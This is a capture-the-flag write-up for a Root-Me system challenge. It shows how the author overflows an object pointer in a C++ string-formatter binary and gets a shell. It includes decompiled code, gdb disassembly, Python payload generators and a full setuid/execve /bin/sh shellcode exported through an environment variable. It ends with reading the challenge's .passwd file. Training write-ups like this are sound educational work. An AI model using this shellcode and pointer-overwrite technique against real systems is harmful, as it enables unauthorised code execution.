### S0lv3d by H4yicl3

First i download binary file with my scp-script
```
#!/bin/sh
echo "password = app-systeme-$1"
scp -P2222 app-systeme-$1@challenge02.root-me.org:./$1 ./

then ./scp [name_of_challenge]
```
I use IDA to analysis the code .
```c
int __cdecl MyStringFormatter::MyStringFormatter(int a1, int a2)
{
  int result; // eax@1

  *(_DWORD *)(a1 + 80) = a2;   // (a1 +80)buffer s input (80 byte)
  result = a1;
  *(_DWORD *)(a1 + 84) = 1;    // (a1+ 84) pointer
  return result;
}
```
that equal source c
```c
class MyStringFormatter
{
public:
    MyStringFormatter( formatter * pFormatter  ):m_pFormatter(pFormatter),m_Id(1) {};  //this function is decompiled by IDA
    void GetInput(int padding )  {
        memset(str ,' ' , SIZE  ); fgets(str+padding,SIZE,stdin); }
    void display() const{m_pFormatter->format(str) ;}
protected:
    char str[SIZE];		//buffer s 
    formatter * m_pFormatter ;  //pointer - >overflow this
    int m_Id;	
};
```
but we meet this in function input
```c
char *__cdecl MyStringFormatter::GetInput(MyStringFormatter *this, int padding)
{
  memset((void *)this, 32, 0x50u);
  return fgets((char *)this + padding, 80, stdin);		//fgets that mean we just write 80 byte 
								//but we have pointer + padding 
}
```
and padding found here
```c
puts("Padding : 1-5\r");
  v3 = fgets((char *)&size, 4, stdin);				//we can overflow more 4 byte to give it come 4
  padding = atoi(v3);						//and we control the pointer 
  if ( padding < 0 || padding > 5 )
  {
    puts("Padding error\r");
    exit(0);
  }
```
after we control see that
```c
  MyStringFormatter::GetInput((MyStringFormatter *)&v12, padding); //after we overflow pointer
  MyStringFormatter::display((MyStringFormatter *)&v12);	   //pointer is called !!
```
So happy !! the program look so good if don't have padding value !! give us overflow the pointer !! So be careful when coding

i try to write my python script look like

```python
padding = "5"
choice  = "1"
buf ="A"*75
retn ="BBBB"
print padding + "\n" + choice +"\n" + buf + retn
```
with that script i controled the return address
i don't know why "A"*75 
so i use strace to analysis
```
python ch20.py |strace ./ch20 
 si_code=SEGV_MAPERR, si_addr=0x42424242} ---
+++ killed by SIGSEGV (core dumped) +++
Segmentation fault (core dumped)
```
maybe i am failure anywhere !! please tell me if you got the answer !!
now we do anything left
use the function getenv here http://pastebin.com/LZM64WGL
shellcode here
```
export hayicle=$(python -c 'print "\x90"*4+"\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"')
```
try run this
```
./getenv hayicle ch20
hayicle will be at 0xffffd8b0
```
now the python script look like
```python
padding = "5"
choice  = "1"
buf ="A"*75
retn ="BBBB"
print padding + "\n" + choice +"\n" + buf + retn
```
it dosen't work ?
what 's wrong !
i try debug with gdb i have that
```asm
gdb-peda$ pdis _ZNK17MyStringFormatter7displayEv
   0x08048a02 <+0>:     push   ebp
   0x08048a03 <+1>:     mov    ebp,esp
   0x08048a05 <+3>:     sub    esp,0x18
   0x08048a08 <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x08048a0b <+9>:     mov    eax,DWORD PTR [eax+0x50]
   0x08048a0e <+12>:    mov    eax,DWORD PTR [eax]       <----------------it break here !! and eax store my return address
   0x08048a10 <+14>:    add    eax,0x8
   0x08048a13 <+17>:    mov    ecx,DWORD PTR [eax]
   0x08048a15 <+19>:    mov    edx,DWORD PTR [ebp+0x8]
   0x08048a18 <+22>:    mov    eax,DWORD PTR [ebp+0x8]
   0x08048a1b <+25>:    mov    eax,DWORD PTR [eax+0x50]
   0x08048a1e <+28>:    mov    DWORD PTR [esp+0x4],edx
   0x08048a22 <+32>:    mov    DWORD PTR [esp],eax
   0x08048a25 <+35>:    call   ecx			  <--------bug it call ecx !! that mean we can redirect to shell code
   0x08048a27 <+37>:    leave  
   0x08048a28 <+38>:    ret 
```
i summed the lines code that relative ecx
```
0x08048a0e <+12>:    mov    eax,DWORD PTR [eax]		//get value in memory at address eax
0x08048a10 <+14>:    add    eax,0x8			//add value with 8
0x08048a13 <+17>:    mov    ecx,DWORD PTR [eax]         //ecx = value at eax
0x08048a25 <+35>:    call   ecx 			//call ecx like a address
``` 
how we redirect to our shellcode ?

the first i mean and write a shellcode look like
```
export hayicle=$(python -c 'print "\x93\xd8\xff\xff"+"A"*4+"\x9f\xd8\xff\xff"+"\x90"*28+"\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"')
```
the python script look like
```python
padding = "5"
choice  = "1"
buf ="A"*75
retn ="\x93\xd8\xff\xff"
print padding + "\n" + choice +"\n" + buf + retn
```
now i explain !! 
the shellcode architect is :
```
hayicle = address_of_shell+junk(4byte)+address_of_shell+12+NOPslide("\x90")+shellcode
```
then i use getenv again to get the address of hayicle value
```
./getenv hayicle ./ch20
hayicle will be at 0xffffd893
```
and now i change tha hayicle value exactly
```
export hayicle=$(python -c 'print "\x93\xd8\xff\xff"+"A"*4+"\x9f\xd8\xff\xff"+"\x90"*28+"\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"')
``` 
run python script we can get the shell
```
(cat input ;cat)|./ch20
Padding : 1-5


        Convert in : 
          1: uppercase  
          2: lowercase  
String to convert: 
whoami
hayicle
```

Ok !! that's done!! GLHF guys!! 


The script i run in sever
```
app-systeme-ch20@challenge02:~$ (cat /tmp/ch20/input ;cat)|./ch20
Padding : 1-5


        Convert in : 
          1: uppercase  
          2: lowercase  
String to convert: 
ls
ch20  ch20.cpp
cat .passwd
```
so surprise !! it works !! 
